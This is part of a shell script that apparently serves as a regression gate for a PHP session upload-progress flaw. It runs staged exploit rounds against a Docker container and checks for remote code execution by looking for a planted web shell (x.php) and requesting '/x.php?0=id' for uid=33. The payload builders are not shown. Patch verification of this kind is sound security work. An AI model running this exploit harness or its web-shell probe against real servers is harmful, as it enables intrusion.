  PRIME_CHILD_SAME=0; [ "$PRIME_CHILDREN_BEFORE" = "$PRIME_CHILDREN_AFTER" ] && PRIME_CHILD_SAME=1
  SESS_SP_AFTER_PRIME=$(sess_size "$SID_SP")
  log_delta=$(docker logs "$CAL" 2>&1 | tail -n +$((log_before + 1)) 2>/dev/null)
  PRIME_FATAL=0
  grep -qE 'Allowed memory size|tried to allocate' "$W/primebody" 2>/dev/null && PRIME_FATAL=1
  echo "$log_delta" | grep -qE 'Allowed memory size|tried to allocate' 2>/dev/null && PRIME_FATAL=1
  if [ "$PRIME_CODE" = "500" ]; then bg_scan; fi
  [ "$PRIME_CODE" = "500" ] || { kill_sleepers; return 1; }
  return 0
}
judge() { # host-level GET /x.php?0=id (never URL-encoded payload in path)
  XSZ=$(docker exec "$CAL" sh -c 'stat -c %s /srv/www/x.php 2>/dev/null' 2>/dev/null | tr -d '\r')
  [ -n "$XSZ" ] || XSZ=MISSING
  RCE=$(curl -s --max-time 5 "$URL/x.php?0=id" 2>/dev/null | head -1)
}
assert_round() {
  local r="$1" fail="" fatal_note=inferred
  [ "${PRIME_FATAL:-0}" = "1" ] && fatal_note=text
  # --- hard preconditions: measurement/scheduling failure is ERROR, never a verdict
  [ "${SESS_SP_ACTUAL:-0}" = "$SESS_SP_EXPECT" ] || fail="$fail grow=${SESS_SP_ACTUAL:-?}"
  [ "${P4W_MARKERS:-0}" = "3" ] || fail="$fail markers=${P4W_MARKERS:-0}"
  [ "${P4W_FREE_CNT:-0}" = "1" ] || fail="$fail free_cnt=${P4W_FREE_CNT:-0}"
  [ "${PRIME_CHILD_SAME:-0}" = "1" ] || fail="$fail child_changed"
  [ "${PRIME_CODE:-}" = "500" ] || fail="$fail prime=${PRIME_CODE:-?}"
  [ "${PRIME_BODY_BYTES:-?}" = "0" ] || fail="$fail prime_body=${PRIME_BODY_BYTES:-?}"
  case "${SESS_SP_AFTER_PRIME:-x}" in
    0|MISSING) : ;;
    *) fail="$fail sp_not_truncated=${SESS_SP_AFTER_PRIME:-?}" ;;
  esac
  [ "${HEALTH:-x}" = "200" ] || fail="$fail health=${HEALTH:-?}"
  # BG level (one-shot gdb; gate: all zero, control: exactly one at the free pid)
  local bg_ok=1 bg_note="bg=${P4W_LEVELS:-?}"
  if [ "$GDB_BG" = "1" ]; then
    if [ "$IS_GATE" = "1" ]; then
      [ "${P4W_LVL1_CNT:-0}" = "0" ] || { bg_ok=0; bg_note="bg=$P4W_LEVELS expected_all_zero"; }
    else
      { [ "${P4W_LVL1_CNT:-0}" = "1" ] && [ "${P4W_LVL1_PIDS:-}" = "${P4W_FREE_PID:-}" ]; } || { bg_ok=0; bg_note="bg=$P4W_LEVELS expected_level1_at_free"; }
    fi
  fi
  [ "$bg_ok" = "1" ] || fail="$fail $bg_note"
  # --- exploit signals: the ONLY evidence that may produce an OPEN verdict
  local exploit="" exploit_n=0
  case "${RCE:-}" in *uid=33*) exploit="$exploit uid33"; exploit_n=1 ;; esac
  if [ "${XSZ:-MISSING}" != "MISSING" ] && [ "${XSZ:-0}" -ge 300 ] 2>/dev/null; then
    exploit="$exploit xphp=${XSZ}B"; exploit_n=1
  fi
  [ "${SR_2A:-0}" = "47" ] && { exploit="$exploit sr2a=47"; exploit_n=1; }
  [ "${SR_2AK2:-0}" = "70" ] && { exploit="$exploit sr2ak2=70"; exploit_n=1; }
  local detail="sr1=${SR_R1:-?} sr2a=${SR_2A:-?}(i0=${I0_2A:-?},a5=${A5_2A:-?}) sr2ak2=${SR_2AK2:-?}(i0=${I0_2AK2:-?},a5=${A5_2AK2:-?}) r2a=${RE_2A:-?} r2ak2=${RE_2AK2:-?} r3=${RE_R3:-?} xphp=${XSZ:-?} rce=[${RCE:0:40}] sleepers_alive=${SLEEPERS_ALIVE:-?}"
  # --- closed conditions (patched behavior).  Deliberately do NOT hardcode the
  # single-worker 374/724 byte counts: they are body/worker-shape observations,
  # not patch semantics.  Patch semantics = no stale consumption (not 47/70,
  # no "|i:0;"), no writer output, HTTP 200 stages, no uid.
  local closed=1
  [ "${RE_2A:-}" = "200" ] || closed=0
  [ "${RE_2AK2:-}" = "200" ] || closed=0
  [ "${RE_R3:-}" = "200" ] || closed=0
  [ "${SR_2A:-0}" != "47" ] || closed=0
  [ "${SR_2AK2:-0}" != "70" ] || closed=0
  [ "${I0_2A:-x}" = "0" ] || closed=0
  [ "${I0_2AK2:-x}" = "0" ] || closed=0
  [ "${XSZ:-MISSING}" = "MISSING" ] || closed=0
  case "${RCE:-}" in *uid=33*) closed=0 ;; esac
  local status
  if [ -n "$fail" ]; then
    status=error
  elif [ "$exploit_n" = "1" ]; then
    # fail-closed hardening: an exploit signal only counts in real pin mode
    if [ "$NO_PIN" = "1" ]; then
      fail="$fail NO_PIN_comparison_only"; status=error
    elif [ "${SLEEPERS_ALIVE:-}" != "3/3" ]; then
      fail="$fail sleepers=${SLEEPERS_ALIVE:-?}"; status=error
    else
      status=open
    fi
  elif [ "$closed" = "1" ]; then
    # fail-closed hardening: a gate PASS requires live 3-sleeper pin + BG
    # verified by the one-shot gdb scan (or explicit ALLOW_BG_UNVERIFIED=1).
    if [ "$NO_PIN" = "1" ]; then
      fail="$fail NO_PIN_comparison_only"; status=error
    elif [ "${SLEEPERS_ALIVE:-}" != "3/3" ]; then
      fail="$fail sleepers=${SLEEPERS_ALIVE:-?}"; status=error
    elif [ "$IS_GATE" = "1" ] && [ "$GDB_BG" != "1" ] && [ "${ALLOW_BG_UNVERIFIED:-0}" != "1" ]; then
      fail="$fail BG_UNVERIFIED"; BG_UNVERIFIED_ERR=1; status=error
    else
      status=closed
    fi
  else
    status=error   # rebaseline: no exploit, but not the expected patched shape either
  fi
  LAST_STATUS=$status
  if [ "$status" = "open" ]; then
    if [ "$IS_GATE" = "1" ]; then
      echo "ASSERT4 GATE OPEN REGRESSION round=$r exploit=[$exploit] grow=$SESS_SP_ACTUAL prime=500/0B $fatal_note markers=$P4W_MARKERS free=$P4W_FREE_PID $detail $bg_note"
    else
      echo "ASSERT4 CTL OPEN expected round=$r exploit=[$exploit] grow=$SESS_SP_ACTUAL prime=500/0B $fatal_note markers=$P4W_MARKERS free=$P4W_FREE_PID $detail $bg_note"
    fi
    return 3
  fi
  if [ "$status" = "closed" ]; then
    echo "ASSERT4 GATE closed round=$r grow=$SESS_SP_ACTUAL prime=500/0B $fatal_note markers=$P4W_MARKERS free=$P4W_FREE_PID $detail sp_after=${SESS_SP_AFTER_PRIME:-?} no_uid=1 $bg_note"
    return 0
  fi
  if [ "$IS_GATE" = "1" ]; then
    echo "ASSERT4 GATE ERROR/rebaseline round=$r fail=[$fail] closed=$closed $detail sp_after=${SESS_SP_AFTER_PRIME:-?} $bg_note"
  else
    echo "ASSERT4 CTL ERROR/rebaseline round=$r fail=[$fail] closed=$closed $detail sp_after=${SESS_SP_AFTER_PRIME:-?} $bg_note"
  fi
  return 2
}
round_run() {
  local r1=$1 out
  # NOTE: build the stage body IMMEDIATELY before its own segment, into its own
  # file, and verify the mode/key sidecar right before sending.  The first run
  # on 2026-10-31 built all bodies up-front into one $W/stagebody, leaving the
  # r3/K3 body for every "stage": R2a was never sent, sr2a=819/1264 and the
  # 8.5.11 control hung in the self-locked writer path.  Per-segment files +
  # mode/key guard make that class of bug unrepresentable.
  kill_sleepers
  clean_round || { echo "ROUND $r1: CLEAN FAIL"; return 2; }
  PRE_SR=$(sess_size "$SID_SR")
  [ "$PRE_SR" = "MISSING" ] || { echo "ROUND $r1: SR_SESSION_NOT_MISSING pre=$PRE_SR"; return 2; }
  echo "PRE_SR MISSING (E4 ok)"
  # segment 1: R1(code) -> prime -> R2a(code)
  mkprog "$CODE"; R1=$(post "$W/progbody"); SR_R1=$(sess_size "$SID_SR")
  OUT=stagebody_r2a mkbody r2a "$AIM" "$CODE"; body_ok stagebody_r2a r2a "$CODE" || return 2
  prime || { echo "ROUND $r1: PRIME1 FAIL code=${PRIME_CODE:-?}"; return 2; }
  SLEEPERS_ALIVE=$(sleepers_alive)
  echo "E5 primed/free: free_pid=${P4W_FREE_PID:-?} sleepers=[${P4W_SLP:-}] markers=${P4W_MARKERS:-?} level1_pids=[${P4W_LVL1_PIDS:-}] sleepers_alive=$SLEEPERS_ALIVE"
  RE_2A=$(post "$W/stagebody_r2a"); SR_2A=$(sess_size "$SID_SR"); SR_TAIL_2A=$(sess_tail "$SID_SR")
  I0_2A=$(sess_count "$SID_SR" '|i:0;'); A5_2A=$(sess_count "$SID_SR" '|a:5:')
  kill_sleepers
  # segment 2: R1(K2) -> prime -> R2a(K2)
  mkprog K2; R1K2=$(post "$W/progbody")
  OUT=stagebody_r2a_k2 mkbody r2a "$AIM" K2; body_ok stagebody_r2a_k2 r2a K2 || return 2
  prime || { echo "ROUND $r1: PRIME2 FAIL code=${PRIME_CODE:-?}"; return 2; }
  RE_2AK2=$(post "$W/stagebody_r2a_k2"); SR_2AK2=$(sess_size "$SID_SR"); SR_TAIL_2AK2=$(sess_tail "$SID_SR")
  I0_2AK2=$(sess_count "$SID_SR" '|i:0;'); A5_2AK2=$(sess_count "$SID_SR" '|a:5:')
  kill_sleepers
  # segment 3: prime -> R3
  OUT=stagebody_r3 mkbody r3 "$AIM_W" K3; body_ok stagebody_r3 r3 K3 || return 2
  prime || { echo "ROUND $r1: PRIME3 FAIL code=${PRIME_CODE:-?}"; return 2; }
  RE_R3=$(post "$W/stagebody_r3")
  kill_sleepers
  HEALTH=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "$URL/plain.php" 2>/dev/null || true)
  judge
  echo "ROUND $r1: R1=$R1 sr1=${SR_R1}B R2a=$RE_2A sr=${SR_2A}B(i0=$I0_2A,a5=$A5_2A,sleepers_alive=$SLEEPERS_ALIVE) R1K2=$R1K2 R2aK2=$RE_2AK2 sr2=${SR_2AK2}B(i0=$I0_2AK2,a5=$A5_2AK2) R3=$RE_R3 x.php=${XSZ} RCE=[${RCE:0:60}]"
  echo "SR_TAIL_2A=$(echo "$SR_TAIL_2A" | head -c 120)"
  echo "SR_TAIL_2AK2=$(echo "$SR_TAIL_2AK2" | head -c 120)"
  assert_round "$r1"
  return $?
}

install_pages
page_pin || exit 2
preflight || exit 2
echo "== r41_patch_gate4w PROFILE=$PROFILE role=$([ "$IS_GATE" = "1" ] && echo gate || echo control) CAL=$CAL URL=$URL RUNS=$RUNS GDB_BG=$GDB_BG NO_PIN=$NO_PIN EXPECT_IMAGE=${EXPECT_IMAGE:-unset} IMAGE=$(docker inspect "$CAL" --format '{{.Image}}' 2>/dev/null)"
echo "== effective: $(docker exec "$CAL" php -i 2>/dev/null | grep -E 'session.upload_progress.cleanup|session.upload_progress.enabled|memory_limit' | tr '\n' ' ')"
pass=0; gate_closed=0; gate_open=0; ctl_open=0; errors=0; last_rc=2
for r in $(seq 1 "$RUNS"); do
  round_run "$r"; rc=$?; last_rc=$rc
  case "$rc" in
    0) pass=$((pass + 1)); [ "$IS_GATE" = "1" ] && gate_closed=$((gate_closed + 1)) ;;
    3) [ "$IS_GATE" = "1" ] && gate_open=$((gate_open + 1)) || ctl_open=$((ctl_open + 1)) ;;
    *) errors=$((errors + 1)) ;;
  esac
done
echo "SUMMARY profile=$PROFILE runs=$RUNS closed=$gate_closed open=$gate_open ctl_open=$ctl_open errors=$errors"
if [ "$errors" -gt 0 ]; then
  if [ "$BG_UNVERIFIED_ERR" = "1" ]; then
    echo "PATCH GATE: ERROR (BG unverified) exit 2"
    exit 2
  fi
  echo "PATCH GATE: ERROR (pin/measurement failure; never a pass) exit 2"
  exit 2
fi
if [ "$IS_GATE" = "1" ]; then
  if [ "$gate_closed" -eq "$RUNS" ]; then echo "PATCH GATE: closed exit 0"; exit 0; fi
  echo "PATCH GATE: OPEN (REGRESSION) exit 3"; exit 3
else
  if [ "$ctl_open" -eq "$RUNS" ]; then echo "PATCH GATE: OPEN (expected on vulnerable) exit 3"; exit 3; fi
  echo "PATCH GATE: CLOSED (unexpected on control) exit 2"; exit 2
fi
